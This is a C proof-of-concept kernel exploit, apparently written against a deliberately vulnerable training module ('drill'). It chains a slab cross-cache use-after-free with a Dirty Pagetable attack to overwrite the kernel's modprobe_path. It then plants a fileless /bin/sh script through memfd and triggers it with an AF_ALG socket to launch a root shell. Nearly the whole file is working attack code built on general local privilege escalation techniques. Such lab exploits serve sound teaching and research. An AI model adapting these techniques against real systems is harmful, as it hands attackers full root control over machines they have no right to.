/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * This PoC performs the Dirty Pagetable attack and gains LPE.
 *
 * Requirements:
 *  1) Enable CONFIG_CRYPTO_USER_API to exploit the modprobe_path LPE technique
 *  2) Disable KASLR and update the MODPROBE_PATH_ADDR below
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include "drill.h"

int do_cpu_pinning(void)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(0, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #0\n");
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Cross-cache attack:
 *  - collect the needed info:
 *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
 *        120
 *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
 *        42
 *  - pin the process to a single CPU
 *  - prepare the page table infrastructure
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
 *  - create new active slab, allocate objs_per_slab objects
 *  - obtain dangling reference from use-after-free bug
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - create a page table to reclaim the freed memory
 *  - perform uaf write using the dangling reference
 *  - change modprobe_path using the overwritten page table
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL 120

#define PTE_INDEX_TO_VIRT(i) ((unsigned long)i << 12)
#define PMD_INDEX_TO_VIRT(i) ((unsigned long)i << 21)
#define PUD_INDEX_TO_VIRT(i) ((unsigned long)i << 30)
#define PGD_INDEX_TO_VIRT(i) ((unsigned long)i << 39)
#define PT_INDICES_TO_VIRT(pgd_index, pud_index, pmd_index, pte_index, page_index) \
		(void *)(PGD_INDEX_TO_VIRT(pgd_index) + \
			 PUD_INDEX_TO_VIRT(pud_index) + \
			 PMD_INDEX_TO_VIRT(pmd_index) + \
			 PTE_INDEX_TO_VIRT(pte_index) + \
			 (unsigned long)page_index)

#define PT_ENTRIES (PAGE_SIZE / 8)

/* Page table bits: Dirty | Accessed | User | Write | Present */
#define PT_BITS 0x67

int prepare_page_tables()
{
	/* prepare infra */
	void *retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}

	/* pre-register new tables and entries */
	for (unsigned long long i = 0; i < 512; i++) {
		retv = mmap((void *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	}
	if (retv == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}
	printf("[+] done, PTE is ready for allocation\n");

	return 0;
}

/* Update the address of modprobe_path for your kernel: */
#define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
#define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)

#define KMOD_PATH_LEN 256 /* default */
#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define SLEEPLOCK(cmp)             \
	while (cmp) {              \
		usleep(10 * 1000); \
	}

static long get_modprobe_path(char *buf, size_t buflen)
{
	int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
	if (fd < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	ssize_t bytes = read(fd, buf, buflen - 1);
	close(fd);

	if (bytes < 0) {
		perror("[-] read");
		return EXIT_FAILURE;
	}
	buf[bytes - 1] = '\x00'; /* cleanup line end */

	printf("[+] current modprobe path: %s\n", buf);
	return 0;
}

/* The exploit can work without it, but will be less reliable */
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0) {
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;

		sleep(9999);
	}

	SLEEPLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

static int strcmp_modprobe_path(char *new_str)
{
	int ret;
	char buf[KMOD_PATH_LEN] = { '\x00' };

	ret = get_modprobe_path(buf, KMOD_PATH_LEN);
	if (ret != 0) {
		return EXIT_FAILURE;
	}

	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

/* check whether address contains modprobe */
void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str,
			   size_t modprobe_path_len)
{
	void *modprobe_addr;
	modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);

	if (modprobe_addr == NULL)
		return NULL;
	printf("[+] found modprobe candidate, rewriting to check if it is false positive\n");

	/* check for modprobe overwriting by reading /proc/sys/kernel/modprobe */
	strcpy(modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0) {
		printf("[-] ^modprobe_path not overwritten!\n");
		return NULL;
	}

	return modprobe_addr;
}

#define PAYLOAD "#!/bin/sh\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

/* fileless approach */
char *prepare_payload(void)
{
	static char fake_modprobe[40] = { 0 };
	pid_t pid = getpid();

	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int shell_stdin_fd = dup(STDIN_FILENO);
	int shell_stdout_fd = dup(STDOUT_FILENO);

	if (dprintf(modprobe_script_fd, PAYLOAD, pid, shell_stdin_fd, pid, shell_stdout_fd) == 0) {
		perror("[-] payload fd\n");
		return NULL;
	}

	lseek(modprobe_script_fd, 0, SEEK_SET);

	if (snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid,
		     modprobe_script_fd) != 0)

		printf("[+] payload written to: %s\n", fake_modprobe);

	return fake_modprobe;
}

/* 
 * refers to:
 * https://blog.theori.io/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch-2dcb8f0fae04
*/
int modprobe_trigger_sock(void)
{
	struct sockaddr_alg sa;

	int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (alg_fd < 0) {
		perror("[-] crypto socker setup\n");
		return EXIT_FAILURE;
	}

	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	strcpy((char *)sa.salg_type, "dummy"); /* dummy string */

	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* This should not return */

	return 0;
}

int main(void)
{
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	char modprobe_path[KMOD_PATH_LEN] = { 0 };
	size_t modprobe_path_len = 0;
	void *modprobe_addr;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = prepare_page_tables();
	if (ret == EXIT_FAILURE)
		goto end;

	ret = get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
	if (ret == EXIT_FAILURE)
		goto end;
	modprobe_path_len = strlen(modprobe_path);

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning() == EXIT_FAILURE)
		goto end;

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] obtain dangling reference from use-after-free bug\n");
 	uaf_n = current_n - 1;
	printf("[+] done, uaf_n: %ld\n", uaf_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the last element in the reserved slabs */
	assert(reserved_from_n + i - 1 == current_n);
	printf("[+] done, now go for page table\n");

	printf("[!] create a page table to reclaim the freed memory\n");
	for (unsigned long long i = 0; i < PT_ENTRIES; i++) {
		*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
	}
	printf("[+] done, vulnerable page table has been created\n");

	printf("[!] perform uaf write using the dangling reference\n");
	long pte_payload = MODPROBE_PATH_ADDR_PART + PT_BITS;
	char str_to_drill[16];

	snprintf(str_to_drill, sizeof(str_to_drill), "0x%08lx %d", pte_payload, 0);
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, str_to_drill);
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	flush_tlb(PT_INDICES_TO_VIRT(1, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */

	for (int i = 0; i < PT_ENTRIES; i++) {
		unsigned int *ptr = (unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
		void *virt_address = PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
		unsigned int value = *ptr;

		if (value != 0xcafecafe) {
			modprobe_addr = memmem_modprobe_path(virt_address, PAGE_SIZE, modprobe_path,
							     modprobe_path_len);

			if (modprobe_addr != NULL) {
				printf("[+] success, userspace modprobe address %p\n",
				       modprobe_addr);
				printf("[!] dump an exploit fd and write its path as new modprobe path via the overwritten target object\n");

				char *privesc = prepare_payload();
				if (privesc == NULL)
					goto end;
				strcpy(modprobe_addr, privesc);

				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
				ret = modprobe_trigger_sock();
				if (ret == EXIT_FAILURE)
					goto end;
				break;
			}
		}
	}

	printf("[-] exploit failed\n");

end:
	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	return ret;
}
